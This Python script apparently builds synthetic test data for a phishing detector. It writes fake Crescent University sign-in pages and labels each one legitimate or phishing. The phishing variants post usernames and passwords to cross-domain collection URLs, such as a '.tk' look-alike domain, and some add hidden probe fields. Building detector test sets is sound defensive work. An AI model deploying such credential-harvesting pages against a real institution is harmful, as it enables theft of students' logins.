"""
generate_landing_pages.py - generates additional SYNTHETIC landing page variants for Crescent University.
"""

import json
import os

ATTACK_SIM_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAGES_DIR = os.path.join(ATTACK_SIM_ROOT, "landing_pages")
MANIFEST_PATH = os.path.join(ATTACK_SIM_ROOT, "detector", "landing_pages_manifest.json")
LABELS_PATH = os.path.join(PAGES_DIR, "labels.csv")

PAGE_TEMPLATE = """<!DOCTYPE html>
<!-- LABEL: {label} - generated synthetic sample for detector testing -->
<html lang="en">
<head><meta charset="UTF-8"><title>Crescent University - {title}</title></head>
<body>
  <h1>Crescent University {title}</h1>
  <form action="{action}" method="POST">
    <label>Matric Number</label><input type="text" name="username">
    <label>Password</label><input type="password" name="password">
    {hidden_fields}
    <button type="submit">Sign in</button>
  </form>
</body>
</html>
"""

CLEAN_TITLES = ["Student Portal", "Single Sign-On", "Result Checker", "Hostel Portal", "Exam Portal"]
PHISH_TITLES = ["Account Verification", "Security Check", "Password Reset", "Session Renewal", "Identity Confirmation"]

CROSS_DOMAIN_ACTIONS = [
    "http://127.0.0.1:5000/collect", "http://198.51.100.77/collect", "http://crescent-verify.tk/collect",
]
HIDDEN_FIELD_SETS = [
    ['<input type="hidden" name="matric_id_guess" value="">'],
    ['<input type="hidden" name="campaign_tag" value="batch">', '<input type="hidden" name="security_answer_probe" value="">'],
    ['<input type="hidden" name="device_fingerprint" value="">'],
]


def build_clean_pages(n, start_idx):
    entries = []
    for i in range(n):
        idx = start_idx + i
        title = CLEAN_TITLES[i % len(CLEAN_TITLES)]
        fname = f"gen_clean_{idx:03d}.html"
        declared_host = f"{title.split()[0].lower()}{idx}.crescentuniversity.edu.ng"
        html = PAGE_TEMPLATE.format(label="legitimate", title=title, action="/local-submit", hidden_fields="")
        with open(os.path.join(PAGES_DIR, fname), "w", encoding="utf-8") as f:
            f.write(html)
        entries.append({"filename": fname, "declared_host": declared_host})
    return entries


def build_phish_pages(n, start_idx):
    entries = []
    for i in range(n):
        idx = start_idx + i
        title = PHISH_TITLES[i % len(PHISH_TITLES)]
        fname = f"gen_phish_{idx:03d}.html"
        declared_host = f"{title.split()[0].lower()}{idx}.crescentuniversity.edu.ng"

        use_cross_domain = (i % 2 == 0)
        use_hidden = (i % 3 == 0)
        action = CROSS_DOMAIN_ACTIONS[i % len(CROSS_DOMAIN_ACTIONS)] if use_cross_domain else "/local-submit"
        hidden_html = "\n    ".join(HIDDEN_FIELD_SETS[i % len(HIDDEN_FIELD_SETS)]) if use_hidden else ""

        html = PAGE_TEMPLATE.format(label="phishing", title=title, action=action, hidden_fields=hidden_html)
        with open(os.path.join(PAGES_DIR, fname), "w", encoding="utf-8") as f:
            f.write(html)
        entries.append({"filename": fname, "declared_host": declared_host})
    return entries


def main():
    with open(MANIFEST_PATH, "r", encoding="utf-8") as f:
        manifest = json.load(f)

    clean_entries = build_clean_pages(8, start_idx=1)
    phish_entries = build_phish_pages(8, start_idx=1)

    manifest.extend(clean_entries)
    manifest.extend(phish_entries)

    with open(MANIFEST_PATH, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    with open(LABELS_PATH, "a", encoding="utf-8") as f:
        for e in clean_entries:
            f.write(f'{e["filename"]},legitimate,"generated synthetic sample"\n')
        for e in phish_entries:
            f.write(f'{e["filename"]},phishing,"generated synthetic sample - cross-domain form action and/or hidden fields"\n')

    print(f"Generated {len(clean_entries)} clean + {len(phish_entries)} phishing landing pages.")


if __name__ == "__main__":
    main()
